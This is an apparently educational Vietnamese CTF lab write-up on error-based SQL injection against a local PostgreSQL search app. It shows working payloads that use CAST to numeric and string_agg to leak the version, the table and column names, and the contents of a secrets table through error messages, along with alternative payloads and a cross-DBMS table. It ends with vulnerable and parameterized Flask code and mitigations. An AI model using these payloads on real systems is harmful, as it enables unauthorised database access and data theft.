# SQLi-017: PostgreSQL CAST Error-based - Complete Writeup

## 📋 Tổng Quan

**Lab:** SQLi-017  
**Technique:** Error-based SQL Injection  
**DBMS:** PostgreSQL  
**Difficulty:** ⭐ Dễ  
**Flag:** `FLAG{p0stgr3sql_c4st_3rr0r}`

---

## 🎯 Mục Tiêu

Khai thác lỗ hổng SQL Injection trên PostgreSQL thông qua kỹ thuật **Error-based** sử dụng **CAST to numeric**.

---

## 📝 Mô Tả Lab

**Application:** Search Filter  
**URL:** `http://localhost:5017/search?q=test`  
**Vulnerable Parameter:** `q` (GET)

Ứng dụng cho phép search/filter dữ liệu. Database có 2 bảng:

- `products`: Bảng công khai chứa sản phẩm (id, name, description)
- `secrets`: Bảng chứa dữ liệu nhạy cảm (id, name, value) - **Mục tiêu**

---

## 🔬 Bước 1: Detection - Phát Hiện SQLi

### 1.1 Test cơ bản với quote

**Request:**

```http
GET /?q=a' HTTP/1.1
Host: localhost:5017
```

**Response:**

```
ERROR: unterminated quoted string at or near "'"
```

✅ **Kết luận:** Có lỗ hổng SQL Injection!

### 1.2 Xác định DBMS

**Error signature:**

- `unterminated quoted string` → PostgreSQL-specific error
- Có thể thấy full SQL syntax error

✅ **Xác nhận:** PostgreSQL database

---

## 🧬 Bước 2: Technique - Hiểu CAST Error-based

### 2.1 CAST là gì?

`CAST` là PostgreSQL function dùng để **convert data type**:

```sql
CAST(expression AS target_type)
-- Hoặc shorthand:
expression::target_type
```

**Ví dụ hợp lệ:**

```sql
CAST('123' AS numeric)     -- OK: '123' → 123
CAST('hello' AS numeric)   -- ERROR: invalid input syntax
```

### 2.2 Khai thác Error-based

Khi ta **CAST một string không phải số** vào `numeric`/`integer`, PostgreSQL sẽ:

1. Cố gắng convert string → number
2. **Thất bại** vì string không phải số hợp lệ
3. **Throw error chứa giá trị gốc**

**Error format:**

```
invalid input syntax for type numeric: "DATA_HERE"
```

→ Data bị **leak qua error message**! 🎯

### 2.3 Payload cơ bản

```sql
-- Lấy database version
' AND 1=CAST(version() AS numeric)--

-- Lấy current user
' AND 1=CAST(current_user AS numeric)--

-- Lấy data từ table
' AND 1=CAST((SELECT column_name FROM table_name LIMIT 1) AS numeric)--
```

### 2.4 STRING_AGG - Kỹ thuật quan trọng

Khi cần lấy **nhiều rows**, sử dụng `string_agg()` để concatenate:

```sql
string_agg(column_name, delimiter)
```

**Ví dụ:**

```sql
-- ❌ Lỗi: subquery returns more than one row
SELECT table_name FROM information_schema.tables WHERE table_schema='public'

-- ✅ Đúng: Concat tất cả thành 1 string
SELECT string_agg(table_name, ',') FROM information_schema.tables WHERE table_schema='public'
-- Output: "products,secrets"
```

---

## 🚀 Bước 3: Enumeration - Liệt Kê Database

### 3.1 Lấy PostgreSQL version

**Payload:**

```sql
a' AND 1=CAST(version() AS numeric)--
```

**Request:**

```http
GET /?q=a'+AND+1%3dCAST(version()+AS+numeric)-- HTTP/1.1
Host: localhost:5017
```

**Response:**

```
ERROR: invalid input syntax for type numeric: "PostgreSQL 17.2 (Debian 17.2-1.pgdg120+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 12.2.0-14) 12.2.0, 64-bit"
```

✅ **PostgreSQL 17.2 trên Debian Linux**

### 3.2 Liệt kê tất cả tables

**Payload:**

```sql
a' AND 1=CAST((SELECT string_agg(table_name, ',') FROM information_schema.tables WHERE table_schema='public') AS numeric)--
```

**Request:**

```http
GET /?q=a'+AND+1%3dCAST((SELECT+string_agg(table_name,+',')+FROM+information_schema.tables+WHERE+table_schema='public')+AS+numeric)-- HTTP/1.1
Host: localhost:5017
```

**Response:**

```
ERROR: invalid input syntax for type numeric: "products,secrets"
```

✅ **Phát hiện 2 bảng:** `products`, `secrets`

### 3.3 Liệt kê columns của bảng SECRETS

**Payload:**

```sql
a' AND 1=CAST((SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='secrets') AS numeric)--
```

**Request:**

```http
GET /?q=a'+AND+1%3dCAST((SELECT+string_agg(column_name,+',')+FROM+information_schema.columns+WHERE+table_name='secrets')+AS+numeric)-- HTTP/1.1
Host: localhost:5017
```

**Response:**

```
ERROR: invalid input syntax for type numeric: "id,name,value"
```

✅ **Bảng SECRETS có 3 cột:** `id`, `name`, `value`

**Cấu trúc bảng SECRETS:**

```
secrets
├── id      (integer)
├── name    (text)
└── value   (text) ← Flag ở đây!
```

---

## 🏆 Bước 4: Exploitation - Lấy Flag

### 4.1 Extract tất cả giá trị từ cột VALUE

**Payload:**

```sql
a' AND 1=CAST((SELECT string_agg(value, ',') FROM secrets) AS numeric)--
```

**Request:**

```http
GET /?q=a'+AND+1%3dCAST((SELECT+string_agg(value,+',')+FROM+secrets)+AS+numeric)-- HTTP/1.1
Host: localhost:5017
```

**Response:**

```
ERROR: invalid input syntax for type numeric: "FLAG{p0stgr3sql_c4st_3rr0r}"
```

🎉 **FLAG:** `FLAG{p0stgr3sql_c4st_3rr0r}`

---

## 📊 Bước 5: Summary - Tổng Kết

### Flow Exploitation (4 bước)

```
1. Version      → PostgreSQL 17.2
2. Tables       → products, secrets
3. Columns      → id, name, value
4. Flag         → FLAG{p0stgr3sql_c4st_3rr0r}
```

### Key Techniques

| Technique              | Purpose                   | Syntax                        |
| ---------------------- | ------------------------- | ----------------------------- |
| **CAST to numeric**    | Trigger error with data   | `CAST(data AS numeric)`       |
| **string_agg()**       | Concatenate multiple rows | `string_agg(col, ',')`        |
| **information_schema** | Enumerate tables/columns  | `information_schema.tables`   |
| **WHERE clause**       | Filter results            | `WHERE table_schema='public'` |

### PostgreSQL vs Other DBMS

| DBMS       | Error Function                  | Aggregate Function   |
| ---------- | ------------------------------- | -------------------- |
| PostgreSQL | `CAST(x AS numeric)`            | `string_agg(x, ',')` |
| MySQL      | `EXTRACTVALUE()`, `UPDATEXML()` | `GROUP_CONCAT(x)`    |
| Oracle     | `CTXSYS.DRITHSX.SN()`           | `LISTAGG(x, ',')`    |
| MSSQL      | `CONVERT(int, x)`               | `STRING_AGG(x, ',')` |

---

## 🎓 Kiến Thức Mở Rộng

### Alternative Techniques

**1. CAST to integer (thay vì numeric):**

```sql
' AND 1=CAST(version() AS int)--
```

**2. Double colon shorthand:**

```sql
' AND 1=(version()::numeric)--
```

**3. Multiple columns concatenation:**

```sql
' AND 1=CAST((SELECT string_agg(name || ':' || value, ', ') FROM secrets) AS numeric)--
```

### LIMIT Trick

Nếu `string_agg()` bị chặn, extract từng row:

```sql
-- Row 1
' AND 1=CAST((SELECT value FROM secrets LIMIT 1 OFFSET 0) AS numeric)--

-- Row 2
' AND 1=CAST((SELECT value FROM secrets LIMIT 1 OFFSET 1) AS numeric)--
```

---

## 🔐 Defense & Mitigation

### Vulnerable Code (Python/Flask)

```python
@app.route('/search')
def search():
    q = request.args.get('q', '')
    # ❌ VULNERABLE: Direct string concatenation
    query = f"SELECT * FROM products WHERE name LIKE '%{q}%'"
    cursor.execute(query)
```

### Secure Code (Parameterized Query)

```python
@app.route('/search')
def search():
    q = request.args.get('q', '')
    # ✅ SECURE: Parameterized query
    query = "SELECT * FROM products WHERE name LIKE %s"
    cursor.execute(query, (f'%{q}%',))
```

### Additional Protections

1. **Input Validation:** Whitelist allowed characters
2. **Least Privilege:** Database user không cần access `information_schema`
3. **Error Handling:** Không expose raw SQL errors
4. **WAF:** Detect và block SQL injection patterns

---

## 📚 References

- [PostgreSQL CAST Documentation](https://www.postgresql.org/docs/current/sql-expressions.html#SQL-SYNTAX-TYPE-CASTS)
- [PostgreSQL string_agg()](https://www.postgresql.org/docs/current/functions-aggregate.html)
- [Information Schema Tables](https://www.postgresql.org/docs/current/information-schema.html)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

---

**🏁 Lab Completed!** Bạn đã thành công khai thác PostgreSQL CAST error-based SQL Injection!
